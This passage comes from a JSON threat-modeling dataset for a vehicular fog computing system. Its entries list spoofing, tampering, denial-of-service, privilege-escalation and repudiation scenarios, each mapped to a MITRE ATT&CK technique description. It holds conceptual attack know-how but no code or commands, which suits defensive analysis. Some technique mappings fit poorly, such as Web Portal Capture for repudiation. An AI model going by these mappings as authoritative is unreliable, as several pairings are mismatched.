                "description": "Adversaries may attempt to cause a denial of service (DoS) by directly sending a high-volume of network traffic to a target. This DoS attack may also reduce the availability and functionality of the targeted system(s) and network. [Direct Network Flood](https://attack.mitre.org/techniques/T1498/001)s are when one or more systems are used to send a high-volume of network packets towards the targeted service's network. Almost any network protocol may be used for flooding. Stateless protocols such as UDP or ICMP are commonly used but stateful protocols such as TCP can be used as well.\n\nBotnets are commonly used to conduct network flooding attacks against networks and services. Large botnets can generate a significant amount of traffic from systems spread across the global Internet. Adversaries may have the resources to build out and control their own botnet infrastructure or may rent time on an existing botnet to conduct an attack. In some of the worst cases for distributed DoS (DDoS), so many systems are used to generate the flood that each one only needs to send out a small amount of traffic to produce enough volume to saturate the target network. In such circumstances, distinguishing DDoS traffic from legitimate clients becomes exceedingly difficult. Botnets have been used in some of the most high-profile DDoS flooding attacks, such as the 2012 series of incidents that targeted major US banks.(Citation: USNYAG IranianBotnet March 2016)",
                "id": "attack-pattern--0bda01d5-4c1d-4062-8ee2-6872334383c3",
                "technique_id": "T1498.001"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "Malware infection on fog nodes results in system crashes or resource exhaustion.",
            "Assumptions": [
                {
                    "Assumption": "Fog nodes can be infected by malware through compromised vehicles or routes.",
                    "Role": "System Security Engineer",
                    "Condition": "Valid if malware vectors include vehicles or network."
                },
                {
                    "Assumption": "Fog nodes lack strong anti-malware protections.",
                    "Role": "Security Administrator",
                    "Condition": "Valid if anti-malware measures are insufficient."
                },
                {
                    "Assumption": "The attacker can propagate malware to fog nodes.",
                    "Role": "Adversary",
                    "Condition": "Valid if attacker has access to initial infection vectors."
                }
            ],
            "Potential Impact": "Service disruption, Data processing halt, Increased attack surface.",
            "MITRE ATT&CK Keywords": [
                "denial of service",
                "malware",
                "resource exhaustion",
                "system crash"
            ],
            "mitre_technique": {
                "name": "OS Exhaustion Flood",
                "description": "Adversaries may launch a denial of service (DoS) attack targeting an endpoint's operating system (OS). A system's OS is responsible for managing the finite resources as well as preventing the entire system from being overwhelmed by excessive demands on its capacity. These attacks do not need to exhaust the actual resources on a system; the attacks may simply exhaust the limits and available resources that an OS self-imposes.\n\nDifferent ways to achieve this exist, including TCP state-exhaustion attacks such as SYN floods and ACK floods.(Citation: Arbor AnnualDoSreport Jan 2018) With SYN floods, excessive amounts of SYN packets are sent, but the 3-way TCP handshake is never completed. Because each OS has a maximum number of concurrent TCP connections that it will allow, this can quickly exhaust the ability of the system to receive new requests for TCP connections, thus preventing access to any TCP service provided by the server.(Citation: Cloudflare SynFlood)\n\nACK floods leverage the stateful nature of the TCP protocol. A flood of ACK packets are sent to the target. This forces the OS to search its state table for a related TCP connection that has already been established. Because the ACK packets are for connections that do not exist, the OS will have to search the entire state table to confirm that no match exists. When it is necessary to do this for a large flood of packets, the computational requirements can cause the server to become sluggish and/or unresponsive, due to the work it must do to eliminate the rogue ACK packets. This greatly reduces the resources available for providing the targeted service.(Citation: Corero SYN-ACKflood)",
                "id": "attack-pattern--0df05477-c572-4ed6-88a9-47c581f548f7",
                "technique_id": "T1499.001"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "Exploiting vulnerabilities in cloud services to cause service outages affecting the entire VFC system.",
            "Assumptions": [
                {
                    "Assumption": "Cloud services are integral to VFC operations and long-term storage.",
                    "Role": "System Architect",
                    "Condition": "Valid if cloud services are indispensable."
                },
                {
                    "Assumption": "Cloud services have known vulnerabilities that can be exploited.",
                    "Role": "System Security Engineer",
                    "Condition": "Valid if vulnerabilities are present and exploitable."
                },
                {
                    "Assumption": "The attacker can identify and exploit these vulnerabilities.",
                    "Role": "Adversary",
                    "Condition": "Valid if attacker has knowledge and skill to exploit vulnerabilities."
                }
            ],
            "Potential Impact": "Widespread service outage, Data unavailability, Disruption of entire VFC operations.",
            "MITRE ATT&CK Keywords": [
                "denial of service",
                "cloud services",
                "vulnerability exploitation",
                "service outage"
            ],
            "mitre_technique": {
                "name": "Application or System Exploitation",
                "description": "Adversaries may exploit software vulnerabilities that can cause an application or system to crash and deny availability to users. (Citation: Sucuri BIND9 August 2015) Some systems may automatically restart critical applications and services when crashes occur, but they can likely be re-exploited to cause a persistent denial of service (DoS) condition.\n\nAdversaries may exploit known or zero-day vulnerabilities to crash applications and/or systems, which may also lead to dependent applications and/or systems to be in a DoS condition. Crashed or restarted applications or systems may also have other effects such as [Data Destruction](https://attack.mitre.org/techniques/T1485), [Firmware Corruption](https://attack.mitre.org/techniques/T1495), [Service Stop](https://attack.mitre.org/techniques/T1489) etc. which may further cause a DoS condition and deny availability to critical information, applications and/or systems. ",
                "id": "attack-pattern--2bee5ffb-7a7a-4119-b1f2-158151b19ac0",
                "technique_id": "T1499.004"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "An attacker gains administrative access to fog nodes through weak access controls, escalating their privileges.",
            "Assumptions": [
                {
                    "Assumption": "Fog nodes perform administrative and critical functions within VFC.",
                    "Role": "System Architect",
                    "Condition": "Valid if fog nodes have broad administrative capabilities."
                },
                {
                    "Assumption": "Access controls on fog nodes are weak or insufficiently implemented.",
                    "Role": "System Security Engineer",
                    "Condition": "Valid if access controls lack robustness."
                },
                {
                    "Assumption": "The attacker has initial access and can exploit control weaknesses.",
                    "Role": "Adversary",
                    "Condition": "Valid if attacker can breach initial defenses."
                }
            ],
            "Potential Impact": "Unauthorized actions, Data manipulation, System control.",
            "MITRE ATT&CK Keywords": [
                "elevation of privilege",
                "access control",
                "administrative access",
                "fog node"
            ],
            "mitre_technique": {
                "name": "Pass the Ticket",
                "description": "Adversaries may \u201cpass the ticket\u201d using stolen Kerberos tickets to move laterally within an environment, bypassing normal system access controls. Pass the ticket (PtT) is a method of authenticating to a system using Kerberos tickets without having access to an account's password. Kerberos authentication can be used as the first step to lateral movement to a remote system.\n\nWhen preforming PtT, valid Kerberos tickets for [Valid Accounts](https://attack.mitre.org/techniques/T1078) are captured by [OS Credential Dumping](https://attack.mitre.org/techniques/T1003). A user's service tickets or ticket granting ticket (TGT) may be obtained, depending on the level of access. A service ticket allows for access to a particular resource, whereas a TGT can be used to request service tickets from the Ticket Granting Service (TGS) to access any resource the user has privileges to access.(Citation: ADSecurity AD Kerberos Attacks)(Citation: GentilKiwi Pass the Ticket)\n\nA [Silver Ticket](https://attack.mitre.org/techniques/T1558/002) can be obtained for services that use Kerberos as an authentication mechanism and are used to generate tickets to access that particular resource and the system that hosts the resource (e.g., SharePoint).(Citation: ADSecurity AD Kerberos Attacks)\n\nA [Golden Ticket](https://attack.mitre.org/techniques/T1558/001) can be obtained for the domain using the Key Distribution Service account KRBTGT account NTLM hash, which enables generation of TGTs for any account in Active Directory.(Citation: Campbell 2014)\n\nAdversaries may also create a valid Kerberos ticket using other user information, such as stolen password hashes or AES keys. For example, \"overpassing the hash\" involves using a NTLM password hash to authenticate as a user (i.e. [Pass the Hash](https://attack.mitre.org/techniques/T1550/002)) while also using the password hash to create a valid Kerberos ticket.(Citation: Stealthbits Overpass-the-Hash)",
                "id": "attack-pattern--7b211ac6-c815-4189-93a9-ab415deca926",
                "technique_id": "T1550.003"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "An attacker exploits software vulnerabilities in the cloud service to escalate privileges.",
            "Assumptions": [
                {
                    "Assumption": "Cloud services manage crucial VFC operations and data.",
                    "Role": "System Architect",
                    "Condition": "Valid if cloud services are critical to operations."
                },
                {
                    "Assumption": "Software vulnerabilities exist within the cloud services.",
                    "Role": "System Developer",
                    "Condition": "Valid if vulnerabilities are present and known."
                },
                {
                    "Assumption": "The attacker can exploit these vulnerabilities to gain higher privileges.",
                    "Role": "Adversary",
                    "Condition": "Valid if attacker has means to exploit software vulnerabilities."
                }
            ],
            "Potential Impact": "Complete takeover of cloud services, Data manipulation, System-wide control.",
            "MITRE ATT&CK Keywords": [
                "elevation of privilege",
                "cloud services",
                "software vulnerabilities",
                "privilege escalation"
            ],
            "mitre_technique": {
                "name": "Additional Cloud Roles",
                "description": "An adversary may add additional roles or permissions to an adversary-controlled cloud account to maintain persistent access to a tenant. For example, adversaries may update IAM policies in cloud-based environments or add a new global administrator in Office 365 environments.(Citation: AWS IAM Policies and Permissions)(Citation: Google Cloud IAM Policies)(Citation: Microsoft Support O365 Add Another Admin, October 2019)(Citation: Microsoft O365 Admin Roles) With sufficient permissions, a compromised account can gain almost unlimited access to data and settings (including the ability to reset the passwords of other admins).(Citation: Expel AWS Attacker)\n(Citation: Microsoft O365 Admin Roles) \n\nThis account modification may immediately follow [Create Account](https://attack.mitre.org/techniques/T1136) or other malicious account activity. Adversaries may also modify existing [Valid Accounts](https://attack.mitre.org/techniques/T1078) that they have compromised. This could lead to privilege escalation, particularly if the roles added allow for lateral movement to additional accounts.\n\nFor example, in AWS environments, an adversary with appropriate permissions may be able to use the <code>CreatePolicyVersion</code> API to define a new version of an IAM policy or the <code>AttachUserPolicy</code> API to attach an IAM policy with additional or distinct permissions to a compromised user account.(Citation: Rhino Security Labs AWS Privilege Escalation)\n\nIn some cases, adversaries may add roles to adversary-controlled accounts outside the victim cloud tenant. This allows these external accounts to perform actions inside the victim tenant without requiring the adversary to [Create Account](https://attack.mitre.org/techniques/T1136) or modify a victim-owned account.(Citation: Invictus IR DangerDev 2024)",
                "id": "attack-pattern--2dbbdcd5-92cf-44c0-aea2-fe24783a6bc3",
                "technique_id": "T1098.003"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "Compromise of roadside units allowing attackers to gain control over VFC operations handled by RSUs.",
            "Assumptions": [
                {
                    "Assumption": "RSUs perform critical data collection and traffic management tasks.",
                    "Role": "System Architect",
                    "Condition": "Valid if RSUs are essential for operations."
                },
                {
                    "Assumption": "RSUs have elevated privileges and perform privileged tasks.",
                    "Role": "System Developer",
                    "Condition": "Valid if RSUs handle administrative actions."
                },
                {
                    "Assumption": "The attacker has methods to compromise RSU security measures.",
                    "Role": "Adversary",
                    "Condition": "Valid if attacker can breach RSU defenses."
                }
            ],
            "Potential Impact": "Unauthorized control over RSUs, Data manipulation, Traffic disruption.",
            "MITRE ATT&CK Keywords": [
                "elevation of privilege",
                "RSU",
                "privileged tasks",
                "traffic management"
            ],
            "mitre_technique": {
                "name": "Impersonation",
                "description": "Adversaries may impersonate a trusted person or organization in order to persuade and trick a target into performing some action on their behalf. For example, adversaries may communicate with victims (via [Phishing for Information](https://attack.mitre.org/techniques/T1598), [Phishing](https://attack.mitre.org/techniques/T1566), or [Internal Spearphishing](https://attack.mitre.org/techniques/T1534)) while impersonating a known sender such as an executive, colleague, or third-party vendor. Established trust can then be leveraged to accomplish an adversary\u2019s ultimate goals, possibly against multiple victims. \n \nIn many cases of business email compromise or email fraud campaigns, adversaries use impersonation to defraud victims -- deceiving them into sending money or divulging information that ultimately enables [Financial Theft](https://attack.mitre.org/techniques/T1657).\n\nAdversaries will often also use social engineering techniques such as manipulative and persuasive language in email subject lines and body text such as `payment`, `request`, or `urgent` to push the victim to act quickly before malicious activity is detected. These campaigns are often specifically targeted against people who, due to job roles and/or accesses, can carry out the adversary\u2019s goal.\u202f\u202f \n \nImpersonation is typically preceded by reconnaissance techniques such as [Gather Victim Identity Information](https://attack.mitre.org/techniques/T1589) and [Gather Victim Org Information](https://attack.mitre.org/techniques/T1591) as well as acquiring infrastructure such as email domains (i.e. [Domains](https://attack.mitre.org/techniques/T1583/001)) to substantiate their false identity.(Citation: CrowdStrike-BEC)\n \nThere is the potential for multiple victims in campaigns involving impersonation. For example, an adversary may [Compromise Accounts](https://attack.mitre.org/techniques/T1586) targeting one organization which can then be used to support impersonation against other entities.(Citation: VEC)",
                "id": "attack-pattern--c9e0c59e-162e-40a4-b8b1-78fab4329ada",
                "technique_id": "T1656"
            }
        }
    ]
},
{
    "case_number": "11",
    "batch_number": "6",
    "threats": [
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker could spoof the identity of a legitimate smart vehicle to communicate with fog nodes.",
            "Assumptions": [
                {
                    "Assumption": "The attacker has access to the network of smart vehicles.",
                    "Role": "Attacker",
                    "Condition": "The attacker is within range to intercept or inject messages."
                },
                {
                    "Assumption": "No robust authentication methods are in place to verify the identity of smart vehicles.",
                    "Role": "System Designer",
                    "Condition": "The system lacks comprehensive vehicle authentication."
                },
                {
                    "Assumption": "The fog nodes accept connections based on basic vehicle identifiers that can be easily spoofed.",
                    "Role": "System Architect",
                    "Condition": "Fog nodes rely on weak identifiers for connection establishment."
                }
            ],
            "Potential Impact": "Unauthorized data interception, potential data manipulation, disruption of system operations.",
            "MITRE ATT&CK Keywords": [
                "spoofing",
                "network",
                "vehicle",
                "identity"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "Attackers could spoof a fog node to gain unauthorized access to cloud services.",
            "Assumptions": [
                {
                    "Assumption": "The attacker has sufficient knowledge of the fog node\u2019s network protocols.",
                    "Role": "Attacker",
                    "Condition": "The attacker has studied the network communication patterns."
                },
                {
                    "Assumption": "The cloud services lack robust fog-to-cloud authentication mechanisms.",
                    "Role": "Network Engineer",
                    "Condition": "Absence of strong authentication and validation protocols."
                },
                {
                    "Assumption": "Fog nodes and cloud services communicate over an insecure or insufficiently encrypted channel.",
                    "Role": "System Designer",
                    "Condition": "Communication channels are not adequately secured."
                }
            ],
            "Potential Impact": "Unauthorized access to sensitive cloud data, potential denial of services, data manipulation.",
            "MITRE ATT&CK Keywords": [
                "spoofing",
                "network",
                "cloud",
                "identity"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker could spoof roadside units (RSUs) to send false traffic information to smart vehicles.",
            "Assumptions": [
                {
                    "Assumption": "The attacker has physical or network access to RSU infrastructure.",
                    "Role": "Attacker",
                    "Condition": "The attacker has control over an RSU or the network segment it is on."
                },
                {
                    "Assumption": "Smart vehicles rely on RSU messages without additional verification.",
                    "Role": "System Designer",
                    "Condition": "Vehicles accept RSU messages without robust validation."
                },
                {
                    "Assumption": "RSU-to-vehicle communication is not encrypted or uses weak encryption.",
                    "Role": "System Architect",
                    "Condition": "Communication channels are insecure."
                }
            ],
            "Potential Impact": "Misinformation leading to accidents, data manipulation, reduced system trustworthiness.",
            "MITRE ATT&CK Keywords": [
                "spoofing",
                "RSU",
                "network",
                "vehicle"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker could tamper with data being transmitted from smart vehicles to fog nodes.",
            "Assumptions": [
                {
                    "Assumption": "The attacker has access to communication channels between smart vehicles and fog nodes.",
                    "Role": "Attacker",
                    "Condition": "The attacker intercepts data in transit."
                },
                {
                    "Assumption": "Data integrity checks are not in place or are insufficient.",
                    "Role": "System Designer",
                    "Condition": "Lack of strong data integrity mechanisms."
                },
                {
                    "Assumption": "There is minimal or no encryption of data transmitted between vehicles and fog nodes.",
                    "Role": "Network Engineer",
                    "Condition": "Transmission is not encrypted."
                }
            ],
            "Potential Impact": "Data corruption, disruption of traffic management decisions, inaccurate alerts.",
            "MITRE ATT&CK Keywords": [
                "data tampering",
                "network",
                "vehicle",
                "fog node"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "Compromised fog nodes could be used to tamper with aggregated data before it is sent to cloud services.",
            "Assumptions": [
                {
                    "Assumption": "The attacker has compromised the physical security of fog nodes.",
                    "Role": "Attacker",
                    "Condition": "Access has been gained to one or more fog nodes."
                },
                {
                    "Assumption": "Fog nodes do not have sufficient integrity verification mechanisms.",
                    "Role": "System Architect",
                    "Condition": "Lack of integrity checks on data processed by fog nodes."
                },
                {
                    "Assumption": "The fog-to-cloud data transmission is not sufficiently encrypted.",
                    "Role": "Network Engineer",
                    "Condition": "Data between fog nodes and cloud is not securely transmitted."
                }
            ],
            "Potential Impact": "Corruption of cloud data, loss of data integrity, inaccurate analytics.",
            "MITRE ATT&CK Keywords": [
                "data tampering",
                "fog node",
                "cloud",
                "network"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "Attackers can tamper with RSUs to send incorrect commands to smart vehicles about traffic conditions.",
            "Assumptions": [
                {
                    "Assumption": "The attacker has the ability to tamper with or replace RSU hardware.",
                    "Role": "Attacker",
                    "Condition": "Physical access to RSUs is possible for the attacker."
                },
                {
                    "Assumption": "Commands from RSUs are accepted by vehicles without additional verification.",
                    "Role": "System Architect",
                    "Condition": "Lack of verification for messages received from RSUs."
                },
                {
                    "Assumption": "Communication between RSUs and vehicles is not protected against tampering.",
                    "Role": "Network Engineer",
                    "Condition": "Messages are sent over insecure or weakly encrypted channels."
                }
            ],
            "Potential Impact": "Potential traffic accidents, systems malfunction, spreading false data.",
            "MITRE ATT&CK Keywords": [
                "tampering",
                "RSU",
                "vehicle",
                "network"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "A user denies sending specific data from their smart vehicle to a fog node.",
            "Assumptions": [
                {
                    "Assumption": "No proper logging of events and data transmissions at the smart vehicle end.",
                    "Role": "System Engineer",
                    "Condition": "Lack of robust logging mechanisms in vehicles."
                },
                {
                    "Assumption": "Fog nodes do not keep records of received data with proper timestamps and IDs.",
                    "Role": "Application Developer",
                    "Condition": "Inadequate logging at the fog node side."
                },
                {
                    "Assumption": "Lack of end-to-end encryption and integrity checks on transmitted data.",
                    "Role": "Network Engineer",
                    "Condition": "Data is sent without cryptographic measures."
                }
            ],
            "Potential Impact": "Inability to trace data origins, disputes over data authenticity, reduced reliability.",
            "MITRE ATT&CK Keywords": [
                "repudiation",
                "logging",
                "vehicle",
                "fog node"
            ],
            "mitre_technique": {
                "name": "Web Portal Capture",
                "description": "Adversaries may install code on externally facing portals, such as a VPN login page, to capture and transmit credentials of users who attempt to log into the service. For example, a compromised login page may log provided user credentials before logging the user in to the service.\n\nThis variation on input capture may be conducted post-compromise using legitimate administrative access as a backup measure to maintain network access through [External Remote Services](https://attack.mitre.org/techniques/T1133) and [Valid Accounts](https://attack.mitre.org/techniques/T1078) or as part of the initial compromise by exploitation of the externally facing web service.(Citation: Volexity Virtual Private Keylogging)",
                "id": "attack-pattern--69e5226d-05dc-4f15-95d7-44f5ed78d06e",
                "technique_id": "T1056.003"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "An attacker denies committing actions on compromised fog nodes which led to tampered data.",
            "Assumptions": [
                {
                    "Assumption": "Lack of logging or monitoring on the fog nodes for tracking modifications.",
                    "Role": "System Administrator",
                    "Condition": "No detailed logging of administrative actions."
                },
                {
                    "Assumption": "Insufficient mechanisms for correlating actions to specific users or processes.",
                    "Role": "Security Engineer",
                    "Condition": "Reliance on weak correlation mechanisms."
                },
                {
                    "Assumption": "No multi-factor authentication or secure access controls on the fog nodes.",
                    "Role": "Network Engineer",
